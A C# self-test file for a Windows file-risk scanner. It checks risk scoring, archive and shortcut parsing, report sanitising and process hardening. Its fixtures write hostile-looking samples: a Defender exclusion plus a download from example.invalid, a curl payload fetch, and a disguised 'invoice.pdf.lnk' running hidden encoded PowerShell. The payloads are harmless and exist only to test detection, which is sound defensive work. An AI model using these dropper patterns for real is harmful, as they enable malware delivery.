using System.Buffers.Binary;
using System.IO;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;

namespace DestinyBlackBox;

internal sealed record ProductSelfTestResult(bool Passed, int Checks)
{
    public string SafeStatusLine => $"PC_BLACK_BOX_SELF_TEST passed={Passed.ToString().ToLowerInvariant()} checks={Checks}";
}

internal static class ProductSelfTest
{
    public static ProductSelfTestResult Run()
    {
        int checks = 0;
        try
        {
            var high = CreateFile("danger.ps1", "Script / active text", "NotSigned", "—", "example.invalid",
                new("danger", "process-injection", "プロセス注入", "Process injection", 60));
            var review = CreateFile("review.exe", "Windows PE", "Valid", "Microsoft Windows", "—",
                new("watch", "internet-zone", "インターネット由来", "Internet origin", 25));
            var low = CreateFile("note.txt", "Text", "Not checked", "—", "—",
                new("info", "low-signal", "弱い兆候", "Low signal", 4));
            var clear = CreateFile("readme.txt", "Text", "Not checked", "—", "—");
            FileAnalysis[] files = [high, review, low, clear];

            Require(FileViewQuery.Apply(files, "ALL", null).Count == 4, ref checks);
            Require(FileViewQuery.Apply(files, "HIGH", null).SequenceEqual([high]), ref checks);
            Require(FileViewQuery.Apply(files, "REVIEW", null).SequenceEqual([review]), ref checks);
            Require(FileViewQuery.Apply(files, "LOW", null).SequenceEqual([low]), ref checks);
            Require(FileViewQuery.Apply(files, "CLEAR", null).SequenceEqual([clear]), ref checks);
            Require(FileViewQuery.Apply(files, "ALL", "danger").SequenceEqual([high]), ref checks);
            Require(FileViewQuery.Apply(files, "ALL", "Microsoft").SequenceEqual([review]), ref checks);
            Require(FileViewQuery.Apply(files, "ALL", "injection").SequenceEqual([high]), ref checks);
            Require(FileViewQuery.Apply(files, "ALL", "example.invalid").SequenceEqual([high]), ref checks);
            Require(!SecurityPolicy.SanitizeText("safe\u202Etxt").Contains('\u202E'), ref checks);
            Require(!SecurityPolicy.WouldExceedCumulativeLimit(SecurityPolicy.MaxTargetBytes - 1, 1, SecurityPolicy.MaxTargetBytes), ref checks);
            Require(SecurityPolicy.WouldExceedCumulativeLimit(SecurityPolicy.MaxTargetBytes - 1, 2, SecurityPolicy.MaxTargetBytes), ref checks);
            Require(!FileInspector.WouldExceedDirectoryLimits(9999, 128), ref checks);
            Require(FileInspector.WouldExceedDirectoryLimits(10000, 128), ref checks);
            Require(FileInspector.WouldExceedDirectoryLimits(1, 129), ref checks);
            Require(!FileInspector.WouldExceedEnumerationLimit(19999), ref checks);
            Require(FileInspector.WouldExceedEnumerationLimit(20000), ref checks);
            Require(!FileInspector.WouldExceedRetainedPathLimit(8L * 1024 * 1024 - 1, 1), ref checks);
            Require(FileInspector.WouldExceedRetainedPathLimit(8L * 1024 * 1024 - 1, 2), ref checks);
            Require(TestValidEmptyArchivePreflight(), ref checks);
            Require(TestValidSingleEntryArchivePreflight(), ref checks);
            Require(TestValidEmptyZip64Preflight(), ref checks);
            Require(TestArchiveEntryFloodPreflight(), ref checks);
            Require(TestUnderreportedArchivePreflight(), ref checks);
            Require(TestAmbiguousEndRecordPreflight(), ref checks);
            SecurityPosture posture = WindowsProcessHardening.Current;
            Require(posture.IsEnforced, ref checks);
            Require(posture.Controls.Select(control => control.Code).Distinct(StringComparer.Ordinal).Count() == posture.Controls.Count, ref checks);
            Require(posture.Controls.All(control =>
                control.Tier != SecurityControlTier.Required || control.State == SecurityControlState.Enforced), ref checks);
            Require(posture.RequiredCount + posture.ReinforcementCount == posture.Controls.Count, ref checks);
            Require(posture.ReinforcementEnforcedCount <= posture.ReinforcementCount, ref checks);
            Require(!ProcessElevation.IsElevated, ref checks);
            Require(ProcessObjectLockdown.VerifyCurrentPolicy(), ref checks);
            Require(ProcessObjectLockdown.VerifyDistinctTokenOwnerModel(), ref checks);
            Require(TestBaselineFailureMessage(), ref checks);
            Require(TestElevationRefusalMessage(), ref checks);
            Require(WindowsProcessHardening.VerifyReportedSideChannelPolicy(), ref checks);
            Require(NetworkIsolationGuard.IsArmedAndManagedTransportFree(), ref checks);
            Require(
                new SecurityControlStatus("probe", SecurityControlTier.PlatformReinforcement, SecurityControlState.NotEnforced)
                    .SafeLine.EndsWith("state=not-enforced", StringComparison.Ordinal) &&
                new SecurityControlStatus("probe", SecurityControlTier.PlatformReinforcement, SecurityControlState.Unavailable)
                    .SafeLine.EndsWith("state=unavailable", StringComparison.Ordinal),
                ref checks);
            Require(TestNetworkIsolationNames(), ref checks);

            var result = new ScanResult
            {
                TargetName = "self-test.txt",
                SecurityProfile = SecurityPosture.ProfileId,
                SecurityControlsEnforced = posture.EnforcedCount,
                SecurityControlsRequired = posture.RequiredCount,
                SecurityReinforcementsEnforced = posture.ReinforcementEnforcedCount,
                SecurityReinforcementsAvailable = posture.ReinforcementCount,
                StartedAt = DateTime.Now
            };
            result.Files.Add(clear);
            string report = ReportBuilder.Build(result, "en");
            Require(report.Contains($"{posture.EnforcedCount}/{posture.RequiredCount} controls enforced", StringComparison.Ordinal), ref checks);
            Require(report.Contains($"{posture.ReinforcementEnforcedCount}/{posture.ReinforcementCount} active on this system", StringComparison.Ordinal), ref checks);
            Require(!report.Contains("C:\\Users\\", StringComparison.OrdinalIgnoreCase), ref checks);
            Require(TestGuardedReportReplacement(result), ref checks);

            Require(FileInspector.IsActiveContentExtension(".EXE"), ref checks);
            Require(FileInspector.IsActiveContentExtension(".ps1"), ref checks);
            Require(FileInspector.IsActiveContentExtension(".LnK"), ref checks);
            Require(TestRiskBands(), ref checks);
            Require(TestReportOmitsAbsolutePathAndSanitizesCells(), ref checks);
            Require(TestTextInspectionHashesWithoutExecuting(), ref checks);
            Require(TestScriptCapabilitiesRaiseReview(), ref checks);
            Require(TestEmbeddedZipMarkerDoesNotHideScript(), ref checks);
            Require(TestLateScriptCapabilitiesRaiseReview(), ref checks);
            Require(TestChunkBoundaryCapability(), ref checks);
            Require(TestBoundedWhitespaceCapabilityAcrossChunk(), ref checks);
            Require(TestLateOddAlignedUnicodeCapability(), ref checks);
            Require(TestLongPathExtensionUsesFullPath(), ref checks);
            Require(TestInvalidArchiveMakesResultIncomplete(), ref checks);
            Require(TestRiskAndCompletenessRemainSeparate(), ref checks);
            Require(TestCapabilityBudgetsStayOrdered(), ref checks);
            Require(TestArchiveContentBudgetsStayOrdered(), ref checks);
            Require(TestUnknownArchiveCoverageIsNotShownAsComplete(), ref checks);
            Require(TestArchiveEntryCapReportsUnknownTotal(), ref checks);
            Require(TestHashLookupUrlFailsClosed(), ref checks);
            Require(TestShortcutCommandLineIsRead(), ref checks);
            Require(TestHostileShortcutFailsClosed(), ref checks);
            Require(TestOleCompoundIsScannedAndNeverComplete(), ref checks);
            Require(TestOversizedLinkInfoStillYieldsTheCommandLine(), ref checks);
            Require(TestUnopenedContainerIsNeverClear(), ref checks);
            Require(TestArchiveFindingsWithoutExtraction(), ref checks);
            Require(TestArchiveCapabilityFindingUpgradesToActiveEntry(), ref checks);
            Require(TestDirectoryNamedArchiveEntryBodyIsScanned(), ref checks);
            Require(TestUnderreportedArchiveEntryBodyIsStillScanned(), ref checks);
            Require(TestPdfZipPolyglotInspectsBothFormats(), ref checks);
            Require(TestMalformedEmbeddedZipIsIncomplete(), ref checks);
            Require(TestNestedArchiveNeverLooksComplete(), ref checks);
            Require(TestDisguisedNestedFormatsStayIncomplete(), ref checks);
            Require(TestLoneZipEndMarkerDoesNotClaimNestedArchive(), ref checks);
            Require(TestPrefixedArchiveBodyInspection(), ref checks);
            Require(TestPrefixedZip64IsRecognized(), ref checks);
            Require(TestPrefixedExtendedZip64IsRecognized(), ref checks);
            Require(TestCanceledInspectionReadsNothing(), ref checks);
            return new ProductSelfTestResult(true, checks);
        }
        catch
        {
            return new ProductSelfTestResult(false, checks);
        }
    }

    /// <summary>
    /// Locks the transport list in both directions: the socket-level assemblies stay blocked, and the
    /// request-level assemblies that System.Configuration loads for local file access stay allowed.
    /// </summary>
    private static bool TestNetworkIsolationNames() =>
        NetworkIsolationGuard.IsBlockedAssemblyName("System.Net.Sockets") &&
        NetworkIsolationGuard.IsBlockedAssemblyName("System.Net.Http") &&
        NetworkIsolationGuard.IsBlockedAssemblyName("system.net.quic") &&
        NetworkIsolationGuard.IsBlockedAssemblyName("System.Net.NameResolution") &&
        !NetworkIsolationGuard.IsBlockedAssemblyName("System.Net.Primitives") &&
        !NetworkIsolationGuard.IsBlockedAssemblyName("System.Net.Requests") &&
        !NetworkIsolationGuard.IsBlockedAssemblyName(null) &&
        !NetworkIsolationGuard.IsBlockedAssemblyName("PresentationCore");

    /// <summary>
    /// The failure dialog must name the required controls that failed, in either language, and must not
    /// pad the list with reinforcements the operator is not being stopped for.
    /// </summary>
    private static bool TestBaselineFailureMessage()
    {
        var posture = new SecurityPosture(
        [
            new SecurityControlStatus("process-object-lockdown", SecurityControlTier.Required, SecurityControlState.NotEnforced),
            new SecurityControlStatus("dep", SecurityControlTier.Required, SecurityControlState.Enforced),
            new SecurityControlStatus("user-shadow-stack", SecurityControlTier.PlatformReinforcement, SecurityControlState.Unavailable)
        ]);
        string english = App.BuildSecurityFailureMessage(posture, japanese: false);
        string japanese = App.BuildSecurityFailureMessage(posture, japanese: true);
        const string expected = "control=process-object-lockdown tier=required state=not-enforced";

        return english.Contains("without inspecting any files", StringComparison.Ordinal) &&
               english.Contains(expected, StringComparison.Ordinal) &&
               !english.Contains("control=user-shadow-stack", StringComparison.Ordinal) &&
               !english.Contains("control=dep", StringComparison.Ordinal) &&
               japanese.Contains("ファイルを調べずに終了", StringComparison.Ordinal) &&
               japanese.Contains(expected, StringComparison.Ordinal) &&
               !japanese.Contains("control=user-shadow-stack", StringComparison.Ordinal);
    }

    /// <summary>An elevated launch must be told what to do instead, in either language.</summary>
    private static bool TestElevationRefusalMessage() =>
        App.BuildElevationRefusalMessage(japanese: false).Contains("administrator rights", StringComparison.Ordinal) &&
        App.BuildElevationRefusalMessage(japanese: true).Contains("通常の権限で起動", StringComparison.Ordinal) &&
        ProcessElevation.SafeRefusalLine.Equals("PC_BLACK_BOX_ELEVATION elevated=true refusing=true", StringComparison.Ordinal);

    /// <summary>Locks the documented score bands and the clamp that keeps a score inside 0–100.</summary>
    private static bool TestRiskBands()
    {
        var high = new FileAnalysis();
        high.Indicators.Add(new Indicator("danger", "one", "ja", "en", 80));
        high.Indicators.Add(new Indicator("danger", "two", "ja", "en", 80));

        var review = new FileAnalysis();
        review.Indicators.Add(new Indicator("watch", "review", "ja", "en", 25));

        var low = new FileAnalysis();
        low.Indicators.Add(new Indicator("info", "low", "ja", "en", 0));

        return high.RiskScore == 100 &&
               high.RiskCode.Equals("HIGH", StringComparison.Ordinal) &&
               review.RiskCode.Equals("REVIEW", StringComparison.Ordinal) &&
               low.RiskCode.Equals("LOW", StringComparison.Ordinal);
    }

    /// <summary>
    /// Keeps the absolute target path out of both report formats and keeps table-breaking and
    /// control characters out of the Markdown cells while the JSON keeps the sanitized name.
    /// </summary>
    private static bool TestReportOmitsAbsolutePathAndSanitizesCells()
    {
        var result = new ScanResult
        {
            TargetPath = @"C:\Users\Private\secret.ps1",
            TargetName = "secret.ps1",
            StartedAt = new DateTime(2026, 8, 6, 9, 0, 0, DateTimeKind.Local),
            Duration = TimeSpan.FromSeconds(1)
        };
        result.Files.Add(new FileAnalysis
        {
            FullPath = result.TargetPath,
            RelativePath = "folder|name`\r\n.ps1",
            Size = 12,
            Sha256 = new string('A', 64),
            FileType = "Script / active text"
        });

        string markdown = ReportBuilder.Build(result, "en");
        string json = ReportBuilder.BuildJson(result, "en");
        using JsonDocument document = JsonDocument.Parse(json);

        return markdown.IndexOf(result.TargetPath, StringComparison.OrdinalIgnoreCase) < 0 &&
               json.IndexOf(result.TargetPath, StringComparison.OrdinalIgnoreCase) < 0 &&
               markdown.Contains("folder/name'\uFFFD\uFFFD.ps1", StringComparison.Ordinal) &&
               document.RootElement.GetProperty("schema").GetString() is "pc-black-box-report-v4" &&
               document.RootElement.GetProperty("files")[0].GetProperty("path").GetString()
                   is "folder|name`\uFFFD\uFFFD.ps1";
    }

    /// <summary>
    /// Inspects an ordinary text file and confirms the reported digest is the digest of the bytes on
    /// disk, so the evidence comes from reading the target rather than from running it.
    /// </summary>
    private static bool TestTextInspectionHashesWithoutExecuting() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "notes.txt");
            File.WriteAllText(path, "ordinary text");

            ScanResult result = Inspect(path);
            if (result.Files.Count != 1) return false;

            FileAnalysis file = result.Files[0];
            return file.RelativePath.Equals("notes.txt", StringComparison.Ordinal) &&
                   file.FileType.Equals("Text", StringComparison.Ordinal) &&
                   file.Sha256.Equals(
                       Convert.ToHexString(SHA256.HashData(File.ReadAllBytes(path))),
                       StringComparison.Ordinal) &&
                   result.RiskCode.Equals("CLEAR", StringComparison.Ordinal);
        });

    /// <summary>Locks the capability findings and the resulting band for a script that reads as active content.</summary>
    private static bool TestScriptCapabilitiesRaiseReview() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "admin.ps1");
            File.WriteAllText(
                path,
                "Add-MpPreference -ExclusionPath C:\\Temp\nInvoke-WebRequest https://example.invalid/tool.exe");

            ScanResult result = Inspect(path);
            if (result.Files.Count != 1) return false;

            FileAnalysis file = result.Files[0];
            return file.Indicators.Any(indicator => indicator.Code.Equals("defender-change", StringComparison.Ordinal)) &&
                   file.Indicators.Any(indicator => indicator.Code.Equals("remote-download", StringComparison.Ordinal)) &&
                   file.RiskCode.Equals("REVIEW", StringComparison.Ordinal);
        });

    /// <summary>A local-header byte sequence inside a script must not reclassify it and skip its text scan.</summary>
    private static bool TestEmbeddedZipMarkerDoesNotHideScript() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "marker.ps1");
            byte[] prefix = Encoding.ASCII.GetBytes("WriteProcessMemory\r\n");
            byte[] bytes = new byte[prefix.Length + 4];
            prefix.CopyTo(bytes, 0);
            new byte[] { 0x50, 0x4B, 0x03, 0x04 }.CopyTo(bytes, prefix.Length);
            File.WriteAllBytes(path, bytes);

            ScanResult result = Inspect(path);
            return result.Files.Count == 1 &&
                   result.Files[0].FileType.Equals("Script / active text", StringComparison.Ordinal) &&
                   result.Files[0].Indicators.Any(indicator => indicator.Code.Equals("process-injection", StringComparison.Ordinal));
        });

    /// <summary>Proves capability matching covers bytes beyond the former first-8-MiB sample boundary.</summary>
    private static bool TestLateScriptCapabilitiesRaiseReview() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "late-capability.ps1");
            const long markerOffset = 8L * 1024 * 1024 + 4096;
            byte[] marker = System.Text.Encoding.ASCII.GetBytes("WriteProcessMemory\n");
            using (var stream = new FileStream(path, FileMode.CreateNew, FileAccess.Write, FileShare.None))
            {
                stream.SetLength(markerOffset);
                stream.Position = markerOffset;
                stream.Write(marker, 0, marker.Length);
                stream.Flush(flushToDisk: true);
            }

            ScanResult result = Inspect(path);
            if (result.Files.Count != 1) return false;

            FileAnalysis file = result.Files[0];
            return file.Indicators.Any(indicator => indicator.Code.Equals("process-injection", StringComparison.Ordinal)) &&
                   file.CapabilityScanApplicable &&
                   file.CapabilityScannedBytes == file.Size &&
                   !result.IsPartial;
        });

    /// <summary>Locks the overlap that preserves an indicator split across two streaming reads.</summary>
    private static bool TestChunkBoundaryCapability() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "boundary-capability.ps1");
            const long markerOffset = 1024L * 1024 - 7;
            byte[] marker = System.Text.Encoding.ASCII.GetBytes("WriteProcessMemory\n");
            using (var stream = new FileStream(path, FileMode.CreateNew, FileAccess.Write, FileShare.None))
            {
                stream.SetLength(markerOffset);
                stream.Position = markerOffset;
                stream.Write(marker, 0, marker.Length);
            }

            ScanResult result = Inspect(path);
            return result.Files.Count == 1 &&
                   result.Files[0].Indicators.Any(indicator => indicator.Code.Equals("process-injection", StringComparison.Ordinal));
        });

    /// <summary>Locks a bounded-whitespace capability match that crosses a streaming boundary.</summary>
    private static bool TestBoundedWhitespaceCapabilityAcrossChunk() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "boundary-whitespace.ps1");
            string markerText = "curl" + new string(' ', 256) + "https://example.invalid/payload";
            byte[] marker = System.Text.Encoding.ASCII.GetBytes(markerText);
            long markerOffset = 1024L * 1024 - marker.Length / 2;
            using (var stream = new FileStream(path, FileMode.CreateNew, FileAccess.Write, FileShare.None))
            {
                stream.SetLength(markerOffset);
                stream.Position = markerOffset;
                stream.Write(marker, 0, marker.Length);
            }

            ScanResult result = Inspect(path);
            return result.Files.Count == 1 &&
                   result.Files[0].Indicators.Any(indicator => indicator.Code.Equals("remote-download", StringComparison.Ordinal));
        });

    /// <summary>Finds UTF-16 capability text even when its first byte is at an odd file offset.</summary>
    private static bool TestLateOddAlignedUnicodeCapability() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "late-unicode-capability.ps1");
            const long markerOffset = 8L * 1024 * 1024 + 4097;
            byte[] marker = System.Text.Encoding.Unicode.GetBytes("WriteProcessMemory\n");
            using (var stream = new FileStream(path, FileMode.CreateNew, FileAccess.Write, FileShare.None))
            {
                stream.SetLength(markerOffset);
                stream.Position = markerOffset;
                stream.Write(marker, 0, marker.Length);
            }

            ScanResult result = Inspect(path);
            return result.Files.Count == 1 &&
                   result.Files[0].Indicators.Any(indicator => indicator.Code.Equals("process-injection", StringComparison.Ordinal)) &&
                   result.Files[0].CapabilityScannedBytes == result.Files[0].Size;
        });

    /// <summary>Uses the untruncated full path when the display path no longer carries its extension.</summary>
    private static bool TestLongPathExtensionUsesFullPath()
    {
        var file = new FileAnalysis
        {
            FullPath = @"C:\fixtures\tool.ps1",
            RelativePath = new string('x', 1024)
        };
        return FileInspector.GetInspectionExtension(file).Equals(".ps1", StringComparison.OrdinalIgnoreCase);
    }

    /// <summary>Exercises the production invalid-archive path and prevents it from being presented as complete.</summary>
    private static bool TestInvalidArchiveMakesResultIncomplete() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "invalid.zip");
            File.WriteAllBytes(path, [0x50, 0x4B, 0x03, 0x04, 0x00, 0x00, 0x00, 0x00]);

            ScanResult result = Inspect(path);
            if (result.Files.Count != 1) return false;

            string report = ReportBuilder.Build(result, "en");
            string json = ReportBuilder.BuildJson(result, "en");
            using JsonDocument document = JsonDocument.Parse(json);
            JsonElement jsonResult = document.RootElement.GetProperty("result");
            return result.Files[0].InspectionLimited &&
                   result.Files[0].Indicators.Any(indicator => indicator.Code.Equals("invalid-archive", StringComparison.Ordinal)) &&
                   result.IsPartial &&
                   result.CompletenessCode.Equals("INCOMPLETE", StringComparison.Ordinal) &&
                   result.AssessmentCode.Contains("INCOMPLETE", StringComparison.Ordinal) &&
                   jsonResult.GetProperty("risk").GetString() is "LOW" &&
                   jsonResult.GetProperty("completeness").GetString() is "INCOMPLETE" &&
                   report.Contains("INCOMPLETE", StringComparison.Ordinal) &&
                   !report.Contains("No obvious risk indicator was found", StringComparison.Ordinal);
        });

    /// <summary>Keeps a known HIGH visible even when a separate completeness failure is present.</summary>
    private static bool TestRiskAndCompletenessRemainSeparate()
    {
        var result = new ScanResult
        {
            TargetName = "high-and-incomplete",
            IsPartial = true,
            PartialReason = "test scope is incomplete"
        };
        var file = new FileAnalysis { RelativePath = "known-risk.ps1" };
        file.Indicators.Add(new Indicator("danger", "known-risk", "既知の強い指標", "Known strong indicator", 60));
        result.Files.Add(file);

        using JsonDocument document = JsonDocument.Parse(ReportBuilder.BuildJson(result, "en"));
        JsonElement jsonResult = document.RootElement.GetProperty("result");
        return result.RiskCode.Equals("HIGH", StringComparison.Ordinal) &&
               result.CompletenessCode.Equals("INCOMPLETE", StringComparison.Ordinal) &&
               result.AssessmentCode.Equals("HIGH+INCOMPLETE", StringComparison.Ordinal) &&
               jsonResult.GetProperty("risk").GetString() is "HIGH" &&
               jsonResult.GetProperty("completeness").GetString() is "INCOMPLETE" &&
               jsonResult.GetProperty("assessment").GetString() is "HIGH+INCOMPLETE";
    }

    /// <summary>
    /// Keeps the per-inspection budget at or above the per-file budget. Inverted budgets would cut every
    /// file short at the smaller number while the report still named the per-file limit as the reason.
    /// </summary>
    private static bool TestCapabilityBudgetsStayOrdered() =>
        FileInspector.MaxCapabilityBytesPerScan >= FileInspector.MaxCapabilityBytesPerFile &&
        FileInspector.MaxCapabilityTimePerScan >= FileInspector.MaxCapabilityTimePerFile;

    private static bool TestArchiveContentBudgetsStayOrdered() =>
        FileInspector.MaxArchiveContentBytesPerFile >= FileInspector.MaxArchiveContentBytesPerEntry &&
        FileInspector.MaxArchiveContentBytesPerScan >= FileInspector.MaxArchiveContentBytesPerFile &&
        FileInspector.MaxArchiveContentTimePerScan >= FileInspector.MaxArchiveContentTimePerFile;

    private static bool TestUnknownArchiveCoverageIsNotShownAsComplete()
    {
        var result = new ScanResult
        {
            TargetName = "bounded.zip",
            IsPartial = true,
            PartialReason = "Archive body total is unknown."
        };
        result.Files.Add(new FileAnalysis
        {
            RelativePath = "bounded.zip",
            ArchiveContentScanApplicable = true,
            ArchiveContentTotalKnown = false,
            ArchiveContentScannedBytes = FileInspector.MaxArchiveContentBytesPerEntry,
            InspectionLimited = true
        });

        string report = ReportBuilder.Build(result, "en");
        using JsonDocument document = JsonDocument.Parse(ReportBuilder.BuildJson(result, "en"));
        JsonElement jsonResult = document.RootElement.GetProperty("result");
        JsonElement jsonFile = document.RootElement.GetProperty("files")[0];
        return report.Contains("64 MB scanned / total unknown", StringComparison.Ordinal) &&
               !report.Contains("64 MB / 64 MB", StringComparison.Ordinal) &&
               !jsonResult.GetProperty("archiveContentTotalKnown").GetBoolean() &&
               jsonResult.GetProperty("archiveContentEligibleBytes").ValueKind == JsonValueKind.Null &&
               !jsonFile.GetProperty("archiveContentTotalKnown").GetBoolean() &&
               jsonFile.GetProperty("archiveContentEligibleBytes").ValueKind == JsonValueKind.Null;
    }

    private static bool TestArchiveEntryCapReportsUnknownTotal() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "bounded-body.zip");
            using (var archive = ZipFile.Open(path, ZipArchiveMode.Create))
            {
                using Stream entry = archive.CreateEntry("payload.dat", CompressionLevel.Fastest).Open();
                byte[] block = new byte[1024 * 1024];
                for (int written = 0; written < FileInspector.MaxArchiveContentBytesPerEntry; written += block.Length)
                {
                    entry.Write(block);
                }
                entry.WriteByte(0);
                entry.WriteByte(0);
            }

            ScanResult result = Inspect(path);
            if (result.Files.Count != 1) return false;
            FileAnalysis file = result.Files[0];
            using JsonDocument document = JsonDocument.Parse(ReportBuilder.BuildJson(result, "en"));
            JsonElement jsonFile = document.RootElement.GetProperty("files")[0];
            return file.ArchiveContentScanApplicable &&
                   !file.ArchiveContentTotalKnown &&
                   file.ArchiveContentEligibleBytes == 0 &&
                   file.ArchiveContentScannedBytes == FileInspector.MaxArchiveContentBytesPerEntry + 1 &&
                   file.Indicators.Any(indicator => indicator.Code.Equals("archive-content-limit", StringComparison.Ordinal)) &&
                   file.InspectionLimited &&
                   result.IsPartial &&
                   jsonFile.GetProperty("archiveContentEligibleBytes").ValueKind == JsonValueKind.Null;
        });

    /// <summary>
    /// Builds a lookup URL only from a well-formed digest. The URL is the one place a target-derived
    /// value is offered for the operator to carry off this machine, so anything else must fail closed.
    /// </summary>
    private static bool TestHashLookupUrlFailsClosed()
    {
        if (!SecurityPolicy.TryBuildHashLookupUrl(new string('A', 64), out string url)) return false;
        if (!url.Equals("https://www.virustotal.com/gui/file/" + new string('a', 64), StringComparison.Ordinal)) return false;

        string[] rejected =
        [
            String.Empty,
            new string('a', 63),
            new string('a', 65),
            new string('g', 64),
            "../" + new string('a', 61)
        ];
        foreach (string candidate in rejected)
        {
            if (SecurityPolicy.TryBuildHashLookupUrl(candidate, out string leaked) || leaked.Length != 0) return false;
        }

        return SecurityPolicy.TryBuildHashLookupUrl(null, out string missing) == false && missing.Length == 0;
    }

    /// <summary>
    /// Builds the delivery shape this product used to miss entirely: a shortcut wearing a document name
    /// whose command line runs an encoded PowerShell payload in a hidden window. Nothing here is executed.
    /// </summary>
    private static byte[] BuildShortcut(string relativePath, string arguments, uint showCommand, int linkInfoBytes = 0)
    {
        const uint hasLinkInfo = 0x00000002;
        const uint hasRelativePath = 0x00000008;
        const uint hasArguments = 0x00000020;
        const uint isUnicode = 0x00000080;

        using var buffer = new MemoryStream();
        using var writer = new BinaryWriter(buffer, System.Text.Encoding.Unicode, leaveOpen: true);
        writer.Write(0x4C);
        writer.Write(new byte[]
        {
            0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
            0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46
        });
        writer.Write((linkInfoBytes > 0 ? hasLinkInfo : 0u) | hasRelativePath | hasArguments | isUnicode);
        writer.Write(0x00000020);
        writer.Write(0L);
        writer.Write(0L);
        writer.Write(0L);
        writer.Write(0);
        writer.Write(0);
        writer.Write(showCommand);
        writer.Write((ushort)0);
        writer.Write((ushort)0);
        writer.Write(0);
        writer.Write(0);

        if (linkInfoBytes > 0)
        {
            writer.Write(linkInfoBytes);
            writer.Write(0x1C);
            writer.Write(0);
            writer.Write(0);
            writer.Write(0);
            writer.Write(0);
            writer.Write(0);
            writer.Write(new byte[linkInfoBytes - 0x1C]);
        }

        foreach (string value in new[] { relativePath, arguments })
        {
            writer.Write((ushort)value.Length);
            writer.Write(System.Text.Encoding.Unicode.GetBytes(value));
        }

        writer.Write(0);
        writer.Flush();
        return buffer.ToArray();
    }

    /// <summary>A shortcut is judged by the command line it carries, not by its extension.</summary>
    private static bool TestShortcutCommandLineIsRead() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "invoice.pdf.lnk");
            string encoded = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes("Write-Host 'self test'"));
            File.WriteAllBytes(path, BuildShortcut(
                @"..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                $"-w hidden -nop -enc {encoded}",
                showCommand: 7));

            ScanResult result = Inspect(path);
            if (result.Files.Count != 1) return false;

            FileAnalysis file = result.Files[0];
            bool Has(string code) => file.Indicators.Any(indicator => indicator.Code.Equals(code, StringComparison.Ordinal));
            return file.FileType.Equals(FileInspector.ShortcutType, StringComparison.Ordinal) &&
                   file.ShortcutTarget.Contains("powershell.exe", StringComparison.OrdinalIgnoreCase) &&
                   file.ShortcutArguments.Contains("-enc", StringComparison.Ordinal) &&
                   Has("shortcut-runs-interpreter") &&
                   Has("encoded-command") &&
                   Has("hidden-window") &&
                   Has("shortcut-hidden-start") &&
                   Has("double-extension") &&
                   file.RiskCode.Equals("HIGH", StringComparison.Ordinal);
        });

    /// <summary>
    /// A shortcut whose declared sizes do not fit must end the walk and say so, never throw and never
    /// present itself as fully read.
    /// </summary>
    private static bool TestHostileShortcutFailsClosed() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "hostile.lnk");
            byte[] shortcut = BuildShortcut(@"C:\Windows\System32\cmd.exe", "/c echo", showCommand: 1);
            // Claim every optional structure is present and hand it nothing but the header.
            BinaryPrimitives.WriteUInt32LittleEndian(shortcut.AsSpan(0x14), 0xFFFFFFFF);
            File.WriteAllBytes(path, shortcut.AsSpan(0, 0x4C + 2).ToArray());

            ScanResult result = Inspect(path);
            if (result.Files.Count != 1) return false;

            FileAnalysis file = result.Files[0];
            return file.FileType.Equals(FileInspector.ShortcutType, StringComparison.Ordinal) &&
                   file.InspectionLimited &&
                   result.IsPartial &&
                   result.AssessmentCode.Contains("INCOMPLETE", StringComparison.Ordinal);
        });

    /// <summary>
    /// An installer or Office document is read for its strings, and is never called complete, because its
    /// storage tree and tables are not parsed.
    /// </summary>
    private static bool TestOleCompoundIsScannedAndNeverComplete() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "setup.msi");
            string encoded = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes("Write-Host 'self test'"));
            byte[] header = [0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1];
            byte[] body = System.Text.Encoding.Unicode.GetBytes($" powershell.exe -enc {encoded} ");
            File.WriteAllBytes(path, [.. header, .. new byte[512], .. body]);

            ScanResult result = Inspect(path);
            if (result.Files.Count != 1) return false;

            FileAnalysis file = result.Files[0];
            return file.FileType.Equals(FileInspector.OleCompoundType, StringComparison.Ordinal) &&
                   file.CapabilityScanApplicable &&
                   file.CapabilityScannedBytes == file.Size &&
                   file.Indicators.Any(indicator => indicator.Code.Equals("encoded-command", StringComparison.Ordinal)) &&
                   file.Indicators.Any(indicator => indicator.Code.Equals("ole-structure-unparsed", StringComparison.Ordinal)) &&
                   file.InspectionLimited &&
                   result.CompletenessCode.Equals("INCOMPLETE", StringComparison.Ordinal) &&
                   !result.AssessmentCode.Equals("CLEAR", StringComparison.Ordinal);
        });

    /// <summary>
    /// A LinkInfo block past the extraction cap is legal and easy to build, so the walk must step over it and
    /// still recover the command line. Otherwise breaking this parser is cheaper than passing it.
    /// </summary>
    private static bool TestOversizedLinkInfoStillYieldsTheCommandLine() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "padded.lnk");
            string encoded = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes("Write-Host 'self test'"));
            File.WriteAllBytes(path, BuildShortcut(
                @"..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                $"-w hidden -nop -enc {encoded}",
                showCommand: 7,
                linkInfoBytes: 128 * 1024));

            ScanResult result = Inspect(path);
            if (result.Files.Count != 1) return false;

            FileAnalysis file = result.Files[0];
            bool Has(string code) => file.Indicators.Any(indicator => indicator.Code.Equals(code, StringComparison.Ordinal));
